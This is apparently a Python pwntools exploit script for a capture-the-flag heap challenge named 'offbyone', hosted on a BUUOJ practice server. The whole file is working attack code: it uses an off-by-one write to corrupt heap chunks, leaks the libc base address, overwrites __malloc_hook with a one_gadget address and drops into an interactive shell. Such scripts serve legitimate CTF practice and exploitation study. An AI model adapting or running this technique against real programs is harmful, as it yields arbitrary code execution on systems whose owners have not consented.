import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='offbyone'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',25735)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc=ELF('../../x64libc/libc.so.6')
			one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('4:edit','1')
			io.sendlineafter('input len',str(a))
			io.sendafter('input your data',c)

		def delete(a):
			io.sendlineafter('4:edit','2')
			io.sendlineafter('input id',str(a))

		def edit(a,c):
			io.sendlineafter('4:edit','4')
			io.sendlineafter('input id',str(a))
			io.sendafter('input your data',c)

		def show(a):
			io.sendlineafter('4:edit','3')
			io.sendlineafter('input id',str(a))
		

		add(0xf0,'a'*0xf0)
		add(0xf0,'a'*0xf0)
		add(0xf0,'a'*0xf0)
		add(0xf0,'a'*0xf0)
		add(0xf0,'a'*0xf0)
		add(0xf0,'a'*0xf0)
		delete(3)
		delete(2)
		delete(1)
		delete(0)
		delete(5)
		add(0xf8,'a'*0xf8)
		add(0xf8,'a'*0xf8)
		add(0xf8,'a'*0xf8)
		add(0xf8,'a'*0xf8)
		add(0xf8,'a'*0xf8)
		delete(6)
		add(0xf8,'a'*0xf8)
		edit(3,'a'*0xf8+'\x01\x05')
		delete(6)
		add(0xf0,'a'*0xf0)
		show(0)
		io.recvline()
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		system_addr=libc.sym['execve']
		bin_sh_addr=libc.search('/bin/sh\x00').next()

		add(0xf0,'a'*0xf0)
		delete(7)
		delete(0)
		delete(5)
		add(0xf0,p64(libc.sym['__malloc_hook']))
		add(0xf0,'/bin/sh\x00')
		add(0xf0,p64(libc_base+one_gadgaet[1]))
		



		success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue